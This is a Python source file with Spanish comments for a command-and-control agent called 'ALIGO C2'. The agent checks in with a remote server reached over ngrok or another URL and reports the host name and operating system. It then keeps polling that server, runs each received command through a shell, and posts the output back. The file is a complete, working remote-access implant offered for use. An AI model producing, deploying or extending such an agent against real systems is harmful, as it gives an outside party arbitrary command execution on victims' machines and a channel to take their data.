"""
Agente C2 - Versión HTTPS para ngrok/Internet
CONFIGURADO PARA: Conectarse a servidor via HTTP/HTTPS (ngrok)

USO:
    python3 agent_ngrok.py https://abc123.ngrok.io
    python3 agent_ngrok.py http://servidor.ejemplo.com:5000
    python3 agent_ngrok.py https://abc123.ngrok-free.app
"""

import json
import subprocess
import platform
import uuid
import time
import sys

try:
    import requests
except ImportError:
    print("[!] ERROR: Se requiere el módulo 'requests'")
    print("[*] Instálalo con: pip install requests")
    sys.exit(1)

# ============================================
# CONFIGURACIÓN FLEXIBLE
# ============================================

# Valores por defecto (cambiar según tu servidor ngrok)
DEFAULT_URL = "https://your-ngrok-url.ngrok.io"

# Si se pasa argumento de línea de comandos, usarlo
if len(sys.argv) >= 2:
    SERVER_URL = sys.argv[1].rstrip('/')  # Quitar / final si existe
else:
    SERVER_URL = DEFAULT_URL

AGENT_ID = "agent-" + str(uuid.uuid4())[:6]
RECONNECT_DELAY = 5  # segundos antes de reintentar si se cae la conexión
POLL_INTERVAL = 2    # segundos entre cada poll al servidor


def execute_command(command: str) -> str:
    """Ejecuta un comando del sistema y captura su salida."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30,
        )
        output = result.stdout if result.stdout else result.stderr
        return output.strip() or "(sin salida)"
    except subprocess.TimeoutExpired:
        return "(error) comando excedió el tiempo límite"
    except Exception as e:
        return f"(error) {e}"


def checkin():
    """Registro inicial en el servidor."""
    try:
        response = requests.post(
            f"{SERVER_URL}/checkin",
            json={
                "agent_id": AGENT_ID,
                "hostname": platform.node(),
                "os": platform.system(),
            },
            timeout=10
        )
        response.raise_for_status()
        return True
    except Exception as e:
        print(f"[!] Error en checkin: {e}")
        return False


def poll_command():
    """Preguntar al servidor si hay comandos pendientes."""
    try:
        response = requests.post(
            f"{SERVER_URL}/poll",
            json={"agent_id": AGENT_ID},
            timeout=10
        )
        response.raise_for_status()
        data = response.json()
        
        if data.get("command") is not None:
            return data
        return None
    except Exception as e:
        print(f"[!] Error en poll: {e}")
        return None


def send_result(msg_id: str, output: str, status: str = "ok"):
    """Enviar resultado de comando al servidor."""
    try:
        response = requests.post(
            f"{SERVER_URL}/result",
            json={
                "agent_id": AGENT_ID,
                "id": msg_id,
                "output": output,
                "status": status,
            },
            timeout=10
        )
        response.raise_for_status()
        return True
    except Exception as e:
        print(f"[!] Error enviando resultado: {e}")
        return False


def run_agent():
    print(f"[*] Agente ID: {AGENT_ID}")
    print(f"[*] Servidor: {SERVER_URL}")
    print(f"[*] Presiona Ctrl+C para detener")
    print()
    
    # Loop principal
    while True:
        try:
            # Paso 1: Checkin (registro inicial)
            print(f"[*] Intentando checkin con el servidor...")
            if not checkin():
                print(f"[!] Checkin falló, reintentando en {RECONNECT_DELAY}s...")
                time.sleep(RECONNECT_DELAY)
                continue
            
            print(f"[+] ✅ Conectado al servidor como {AGENT_ID}")
            
            # Paso 2: Loop de polling
            while True:
                # Preguntar si hay comandos
                cmd_data = poll_command()
                
                if cmd_data and cmd_data.get("type") == "cmd":
                    cmd = cmd_data.get("command")
                    msg_id = cmd_data.get("id")
                    
                    print(f"[cmd recibido] id={msg_id}: {cmd}")
                    
                    # Ejecutar comando
                    output = execute_command(cmd)
                    
                    # Enviar resultado
                    if send_result(msg_id, output):
                        print(f"[resultado enviado] id={msg_id}")
                    else:
                        print(f"[!] Fallo al enviar resultado id={msg_id}")
                
                # Esperar antes del siguiente poll
                time.sleep(POLL_INTERVAL)
        
        except requests.exceptions.ConnectionError:
            print(f"[!] No se pudo conectar al servidor: {SERVER_URL}")
            print(f"[*] ¿Está el servidor corriendo? ¿Es correcta la URL?")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)
        
        except requests.exceptions.Timeout:
            print(f"[!] Timeout al conectar a {SERVER_URL}")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)
        
        except KeyboardInterrupt:
            print("\n[*] Agente detenido por el usuario")
            sys.exit(0)
        
        except Exception as e:
            print(f"[!] Error inesperado: {e}")
            print(f"[*] Reintentando en {RECONNECT_DELAY}s...")
            time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    print("=" * 50)
    print("  ALIGO C2 - Agente HTTPS")
    print("=" * 50)
    print()
    
    if len(sys.argv) > 1:
        print("[i] Usando configuración de línea de comandos")
    else:
        print("[i] Usando configuración por defecto")
        print(f"[i] Puedes especificar: python3 {sys.argv[0]} <url>")
        print(f"[i] Ejemplo: python3 {sys.argv[0]} https://abc123.ngrok.io")
    
    print()
    run_agent()
